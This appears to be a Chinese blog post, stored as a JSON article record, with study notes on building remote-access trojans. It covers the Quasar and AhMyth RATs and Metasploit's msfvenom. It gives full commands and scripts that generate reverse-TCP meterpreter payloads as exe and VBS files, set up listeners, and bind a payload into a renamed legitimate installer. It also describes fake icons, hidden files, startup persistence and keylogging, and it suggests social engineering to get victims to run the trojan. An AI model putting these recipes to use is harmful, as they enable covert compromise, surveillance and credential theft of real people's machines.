{"title":"Metasploit系列笔记","uid":"802434193ebbe0ac8767c7ca546461df","slug":"Metasploit系列笔记","date":"2021-07-06T15:28:43.000Z","updated":"2021-07-17T16:59:11.999Z","comments":true,"path":"api/articles/Metasploit系列笔记.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/20210718005833.png","content":"<p>Metasploit大家应该都很熟悉了，我也有用过，但是之前也就是浅薄的去学习一些简单的使用方法，并没有细致地去了解和学习这个攻击框架，现在算是补课吧，利用考研复习时休息的时间补补课吧。</p>\n<h1 id=\"Windows-木马工具\"><a href=\"#Windows-木马工具\" class=\"headerlink\" title=\"Windows 木马工具\"></a>Windows 木马工具</h1><p>先来学习一下一个Windows木马生成工具，名字叫做quasar，他在github上有项目可以直接下载，github项目地址:<a href=\"https://github.com/quasar/Quasar%EF%BC%8CWindows%E4%B8%8B%E7%9B%B4%E6%8E%A5%E5%B0%B1%E6%98%AF.exe%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%8C%E6%93%8D%E4%BD%9C%E7%AE%80%E5%8D%95%EF%BC%8C%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%89%93%E5%BC%80%E4%BD%BF%E7%94%A8%E4%BA%86%E3%80%82\">https://github.com/quasar/Quasar，Windows下直接就是.exe执行文件，操作简单，生成证书后就可以打开使用了。</a></p>\n<p>打开quasar后可以生成和监听，首先来看监听，监听的话打开setting，进行设置监听端口，这个就类似于listing xxx端口了，点击开始监听就开始监听相关端口了。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181059.png\" alt=\"image-20210706235817966\"></p>\n<p>下面看看木马的构建，首先是basic setting可以设置tag方便标识，还可以设置mutec（用guid来表示程序）是未来防止木马进程多次启动，连接设置中设置木马连接的主机和端口。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181057.png\" alt=\"image-20210707194244577\"></p>\n<p>在installation设置中可以设置是否开机自启，并且可以自定义启动项名称，这里的Quasar Client Startup是默认的名称，可以自行修改。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181054.png\" alt=\"image-20210707194449605\"></p>\n<p>这里还有一个安装选项，选上安装选项后，点击木马后不仅会添加启动项，而且还会安装到系统中，其中选项有设置文件属性伪隐藏，类似于使用命令<code>attrib +h xxx.exe</code>，这将会起到隐藏文件的作用，如果需要解除隐藏则使用<code>attrib -h xxx.exe</code>即可。</p>\n<p>接下来在Assembly设置中可以选择一个伪造的图标，以便于更加具有迷惑性。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181051.png\" alt=\"image-20210707213403222\"></p>\n<p>在monitoring设置中还可以开启键盘按键记录功能，通过此功能可以获取被害人的输入信息，甚至获得密码等敏感信息。</p>\n<p>通过一些手段，将该木马程序传入被害者电脑，并且诱导被害者点击运行程序。一旦被害者点击，木马程序即开始运行并且加入自启动项。作为攻击者端，就会看到目标主机上线了，并且可以对其进行一些程序执行、文件管理、进程查看等等一系列操作。但是也有一点必须要注意，使用quasar生成的木马是基于.net 4 framework的，所以必须要拥有相关环境，才能正常运行木马，否则会报错。</p>\n<p>通过上面的设置我们可以伪造一个QQ样式的图标，他的欺骗性就大大提高了。</p>\n<p>下面进行测试，在拥有可用.net环境的Windows 10系统上进行木马测试。首先我先要把这个伪装的木马放到目标靶机上。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181045.png\" alt=\"image-20210708173013523\"></p>\n<p>双击运行这个人畜无害的QQ，就开始运行我们的木马了。我们也可以通过任务管理器看到这一点。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181040.png\" alt=\"image-20210708173421096\"></p>\n<p>再回到我们的攻击机，可以发现攻击机上已经可以，看到靶机上线了。同时我们可以看到这台靶机的相关信息，用户名计算机号，系统版本，地区都可以被看到。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181038.png\" alt=\"image-20210708173539545\"></p>\n<p>下面我们开始利用木马进行攻击，首先可以进行信息收集，查看详细的系统信息。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181036.png\" alt=\"image-20210708173905891\"></p>\n<p>可以利用文件管理器，访问目标靶机的文件系统，并且上传和下载文件，删除执行，这都是可以实现的。通过木马还可以实现更多的系统管理功能，例如系统自启动项目，任务管理器，TCP连接情况，注册表修改，关机重启，反向代理，远程程序执行等操作。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181030.png\" alt=\"image-20210708174334159\"></p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181028.png\" alt=\"image-20210708174405120\"></p>\n<p>下面重点来看一个有用的东西远程shell，命令执行真的就是爽歪歪。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181025.png\" alt=\"image-20210708174758479\"></p>\n<p>远程程序执行也是一个有点意思的点，再quasar中选择本地的可执行文件或者在线的可执行文件，即可在靶机上执行了。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181013.png\" alt=\"image-20210708175028681\"></p>\n<p>回到靶机看一下，他就已经运行起来了。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181005.png\" alt=\"image-20210708175116511\"></p>\n<p>并且我们还可以记录靶机用户的键盘输入信息，从而一定的课程获取敏感信息，对用户有监听作用。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708181002.png\" alt=\"image-20210708175708330\"></p>\n<p>还可以进行图形化的远程连接，并且该连接时靶机端并不会出现异常依旧正常显示。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708180913.png\" alt=\"image-20210708175908144\"></p>\n<p>甚至还可以弹窗信息，推送想要推送的信息。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210708180857.png\" alt=\"image-20210708180025940\"></p>\n<p>但是如何放置到目标靶机上还是有难度的，目前我想法的话，应该是要结合社会工程学手段才行，或者一些其他手段诱导下载到用户本地。</p>\n<h1 id=\"Android木马工具\"><a href=\"#Android木马工具\" class=\"headerlink\" title=\"Android木马工具\"></a>Android木马工具</h1><p>Android木马使用AhMyth-Android-RAT项目，他的github项目地址为<a href=\"https://github.com/AhMyth/AhMyth-Android-RAT\">AhMyth/AhMyth-Android-RAT: Android Remote Administration Tool (github.com)</a></p>\n<p>该项目提供了Windows版本和Linux版本。我这里直接下载该项目的二进制版本，直接就可以使用了。</p>\n<p>图形化工具使用起来也是较为简单，和Windows木马工具一样上来也是设置监听的端口号时什么，默认是监听42474端口来实现的。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210709001425.png\" alt=\"image-20210708232318132\"></p>\n<p>下面来看一下简单的木马构建过程，也很简单输入IP和端口，这个和之前是一样的。然后直接点击build即可生成一个apk文件。<strong>注意：AhMyth不支持最新的JDK，所以要使用就必须要使用JDK 8才能构建木马</strong></p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210709001421.png\" alt=\"image-20210708234210675\"></p>\n<p>可以在相应的路径下找到它，下面我将其安装到我的安卓模拟器上进行实验，很遗憾的是可能是由于Android SDK的原因，我的模拟器上运行该木马apk后，PC机上并没有接收到上线通知，可以说是没有成功了，但是Android系统就是如此，其为了安全性进行了严格权限管理，并且API版本众多SDK版本也众多，在实战下还是会又很大的概率遇到该问题的，这就需要具有安卓开发能力了，毕竟工具只能做到这里了。</p>\n<p>还可以将其隐藏到其他的应用中去，这样就可以很好的解决授权问题，因为某些软件用户一定会给予其一定的权限。虽然没有成功，但是工具确实也是好工具，值得收藏一下。</p>\n<h1 id=\"MSF木马配置\"><a href=\"#MSF木马配置\" class=\"headerlink\" title=\"MSF木马配置\"></a>MSF木马配置</h1><p>基础用法:<code>show options</code>展示选项。<code>set LHOST xxx.xxx.xxx.xxx</code>这是设置相关选项的方法。</p>\n<p><code>msfconsole -q</code>不带banner信息的快速启动。</p>\n<p>调用exploit/multi/handler模块<code>use exploit/multi/handler</code></p>\n<p>通过<code>set payload xxxx/xxx/xxx/</code>来设置使用的payload</p>\n<p>这是msf端需要的操作。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msfconsole -q\nuse exploit&#x2F;multi&#x2F;handler\nset payload windows&#x2F;meterpreter&#x2F;reverse_tcp\nset LHOST 192.168.51.124\nset LPORT 4444\nrun&#x2F;exploit\nmeterpreter&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>x86简单后门生成：</p>\n<p><strong>下面使用msfvenom来生成木马</strong></p>\n<pre class=\"line-numbers language-sh\" data-language=\"sh\"><code class=\"language-sh\">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -f exe -a x86 --platform windows -o .&#x2F;meter_re_tcp_x86.exe LHOST&#x3D;192.168.51.124 LPORT&#x3D;4444\n#其中-f format表示木马格式\n#-p为payload\n#-a 表示芯片架构\n#--platfor表示系统类型\n#-o为生成位置\n#更多的使用选项可以直接-h查看。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210709235407.png\" alt=\"image-20210709232715120\"></p>\n<p>在msf上使用run命令开始监听，同时把生成的木马放进靶机里运行，msf成功上线木马。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210709235417.png\" alt=\"image-20210709233108401\"></p>\n<h1 id=\"MSF木马VBS配置\"><a href=\"#MSF木马VBS配置\" class=\"headerlink\" title=\"MSF木马VBS配置\"></a>MSF木马VBS配置</h1><p>Windows VBS脚本生成，依旧是和上面的生成方式类似。</p>\n<p>只有涉及到上面说过的这个-f参数也就是format，只要设置为vbs格式就ok了</p>\n<pre class=\"line-numbers language-sh\" data-language=\"sh\"><code class=\"language-sh\">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -f vbs -a x86 --platform windows -o .&#x2F;meter_re_tcp_x86.vbs LHOST&#x3D;192.168.51.124 LPORT&#x3D;4444<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>至于想要知道各个参数有哪些个可选项，就可以利用-l命令加上选项全称来进行查询，例如这里我要知道-f参数都支持哪些就用命令<code>msfvenom -l format</code>来查询。</p>\n<p>为了方便也可以使用shell脚本来一件生成，其实本质就是把命令写成shell而已了。但是相比每次输入命令来生成，直接运行shell来生成确实是方便了不少了。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">arch&#x3D;x86\nformat&#x3D;vbs\nplatform&#x3D;windows\nPORT&#x3D;4444\nHOST&#x3D;192.168.3.78\nout&#x3D;.&#x2F;meter_re_tcp_x86.vbs\npaylaod&#x3D;windows&#x2F;meterpreter&#x2F;reverse_tcp\nmsfvenom -p $paylaod -f $format -a $arch --platform $platform -o $out LHOST&#x3D;$HOST LPORT&#x3D;$PORT<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>一键就可以生成了，同时还可以配置一个文件用来一键启动MSF监听，也可以剩下非常多的重复步骤。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">use exploit&#x2F;multi&#x2F;handler\nset payload windows&#x2F;meterpreter&#x2F;reverse_tcp\nset LHOST 192.168.3.78\nset LPORT 4444\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这是利用了metasploit自己提供的一个功能，可以提前将命令写入一个文件，类似与配置文件，然后使用-r命令自动加载。</p>\n<p>下面我们就使用上面的shell脚本先生成一个x86的vbs木马。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210710200627.png\" alt=\"image-20210710194036325\"></p>\n<p>木马生成后，还是将其放入到实验靶机上，结合msf的一键启动监听脚本来使用。</p>\n<p><code>msfconsole -r msf_start</code>即可启动到监听。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210710200636.png\" alt=\"image-20210710194659980\"></p>\n<p>成功到达监听处，此时和之前一样在Windows上执行vbs文件，就可以在系统上成功监听到PC的上线。并且我们可以在系统上创建文件和文件夹都是可以实现的。但是这个直接生成的vbs脚本在Windows10系统上使用Windows Defender去扫描，它居然没有报毒，但是好在执行的时候，其还是检测到了其的木马行为。所以这种直接生成的木马在实战中并不能直接使用，因为杀软会直接处理了它，所以还需要更多的加工才能够有较好的效果。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210710200639.png\" alt=\"image-20210710195501079\"></p>\n<p>现在我们回过头来看看生成的vbs脚本是如何写的。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210710200643.png\" alt=\"image-20210710195840281\"></p>\n<p>首先是这部分代码，是一个函数，可以看出主要是创建了一个XML对象，并且对默写字符串进行了一个解base64的处理，然后写入到对象数据吧。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210710200645.png\" alt=\"image-20210710200036419\"></p>\n<p>下面这部分则是另一个函数，在这个函数中，调用了上面的那个base64解码函数，对第一句的字符串进行解码，然后把解码结果写入到了一个文件并且将其保存，然后就会去执行这个文件，再将其删除。也就是说加载到内存中即删除原有木马文件。我们无法从该木马文件中直接看到恶意语句，因为其做了一个混淆的工作。</p>\n<p>简单的异常木马vbs文件，关注这几个点，如果它又创建写入文件并且执行，还紧跟这一个删除文件的操作，就很有可能是有问题的。</p>\n<h1 id=\"MSF木马捆绑\"><a href=\"#MSF木马捆绑\" class=\"headerlink\" title=\"MSF木马捆绑\"></a>MSF木马捆绑</h1><p>木马捆绑可以提升他的混淆性，被捆绑文件依旧可以正常执行，但是恶意代码也会同时执行。</p>\n<p>我们可以尝试使用-x参数来将恶意木马捆绑到其他文件上。稍微改一改之前的脚本。</p>\n<pre class=\"line-numbers language-sh\" data-language=\"sh\"><code class=\"language-sh\">arch&#x3D;x86\nformat&#x3D;exe\nplatform&#x3D;windows\nPORT&#x3D;4444\nHOST&#x3D;192.168.3.78\nout&#x3D;冰点下载器_3.2.16.0125_Single.exe\npaylaod&#x3D;windows&#x2F;meterpreter&#x2F;reverse_tcp\nx&#x3D;&#x2F;home&#x2F;a1andns&#x2F;test&#x2F;冰点下载器_3.2.16.0125_Single.exe\n\nmsfvenom -p $paylaod -f $format -a $arch --platform $platform -o $out -x $x LHOST&#x3D;$HOST LPORT&#x3D;$PORT<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在kali上运行脚本来捆绑木马。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210711200422.png\" alt=\"image-20210711193524262\"></p>\n<p>将绑定的exe文件放入到虚拟机里头。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210711200427.png\" alt=\"image-20210711194903059\"></p>\n<p>在Windows运行成功上线，当原有程序并没有成功运行，怀疑是程序启动的入口被修改为了恶意木马的地址。但是因为其过于暴露，目前的杀软基本都可以成功检测出他的恶意行为。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210711200433.png\" alt=\"image-20210711195925748\"></p>\n","text":"Metasploit大家应该都很熟悉了，我也有用过，但是之前也就是浅薄的去学习一些简单的使用方法，并没有细致地去了解和学习这个攻击框架，现在算是补课吧，利用考研复习时休息的时间补补课吧。 Windows 木马工具先来学习一下一个Windows木马生成工具，名字叫做quasar，他...","link":"","photos":[],"count_time":{"symbolsCount":"5k","symbolsTime":"5 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":31,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"MSF","slug":"MSF","count":1,"path":"api/tags/MSF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Windows-%E6%9C%A8%E9%A9%AC%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">Windows 木马工具</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Android%E6%9C%A8%E9%A9%AC%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">Android木马工具</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#MSF%E6%9C%A8%E9%A9%AC%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">MSF木马配置</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#MSF%E6%9C%A8%E9%A9%ACVBS%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">MSF木马VBS配置</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#MSF%E6%9C%A8%E9%A9%AC%E6%8D%86%E7%BB%91\"><span class=\"toc-text\">MSF木马捆绑</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"WeChat RCE漏洞复现","uid":"1616535b9463aaa7ebb1eeba1c901452","slug":"WeChat-RCE漏洞复现","date":"2021-07-17T15:45:22.000Z","updated":"2021-07-17T16:41:13.284Z","comments":true,"path":"api/articles/WeChat-RCE漏洞复现.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/20210718004059.png","text":"前言4月份有一个Chrome的RCE 0day闹得沸沸扬扬，吓得我是赶紧就升级到了最新的Chrome，但是其实低版本Chrome也并非就非常危险，因为chrome默认开启了sandbox功能的，所以说正常情况下漏洞也无法被利用。 紧接着Wechat RCE的消息传遍了大江南北，仔...","link":"","photos":[],"count_time":{"symbolsCount":"7.5k","symbolsTime":"7 mins."},"categories":[{"name":"漏洞复现","slug":"漏洞复现","count":4,"path":"api/categories/漏洞复现.json"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":5,"path":"api/tags/漏洞复现.json"},{"name":"RCE","slug":"RCE","count":4,"path":"api/tags/RCE.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"强网杯2021-pop链","uid":"2f7fe6f4a9640694ceed20c9c2405618","slug":"强网杯2021-pop链","date":"2021-06-28T15:34:20.000Z","updated":"2021-06-28T15:37:27.723Z","comments":true,"path":"api/articles/强网杯2021-pop链.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/20210628233657.png","text":"强网杯2021-pop链起初以为pop链是固定的，没有想到还是随机生成的，而且为了混淆16W行也是够狠的。 这题后来看了题解是使用一个工具来进行pop链的寻找的，这里我用来笨办法，手动看就是废时间，还需要运气，也算是拿了个八血。 http:&#x2F;&#x2F;eci-2ze6...","link":"","photos":[],"count_time":{"symbolsCount":"4.2k","symbolsTime":"4 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":14,"path":"api/tags/CTF.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}